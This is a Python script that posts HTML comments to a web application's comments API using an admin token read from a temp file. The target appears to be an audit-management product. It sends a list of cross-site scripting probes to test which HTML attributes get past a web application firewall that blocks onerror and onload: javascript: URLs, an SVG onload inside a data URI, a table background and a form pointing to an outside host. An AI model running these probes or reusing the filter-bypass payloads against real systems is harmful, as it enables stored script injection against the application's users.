import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def post(html):
    body={"comment":{"type":"Comment","commentable_type":"ExceptionRequest",
                     "commentable_id":33,"message_raw":html,"message_html":html}}
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+'/api/v1/comments',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXT'+uuid.uuid4().hex[:5]
print("=== do ATTRIBUTES survive? (WAF blocks onerror/onload by name) ===")
probes=[
 ('span-style',   f'<span style="color:red">{tag}</span>'),
 ('div-style',    f'<div style="background:url(x)">{tag}</div>'),
 ('img-src-js',   f'<img src="javascript&colon;alert(1)">{tag}'),
 ('img-src-data', f'<img src="data:image/svg+xml,<svg onload=alert(1)>">{tag}'),
 ('td-bgcolor',   f'<table><tr><td background="javascript&colon;alert(1)">{tag}</td></tr></table>'),
 ('div-id',       f'<div id="zx{tag}">{tag}</div>'),
 ('span-class',   f'<span class="x">{tag}</span>'),
 ('span-title',   f'<span title="zx{tag}">{tag}</span>'),
 ('img-alt',      f'<img src=x alt="zx{tag}">'),
 ('a-name',       f'<a name="zx{tag}">{tag}</a>'),
 ('form',         f'<form action="https://x.com">{tag}</form>'),
 ('input',        f'<input value="zx{tag}">'),
]
for label,h in probes:
    c,b=post(h)
    st=''
    if c in ('200','201'):
        try: st=repr(json.loads(b)['comments'][0].get('message_html'))[:80]
        except: pass
    print(f"  {label:14} {c:>4}  {st}")
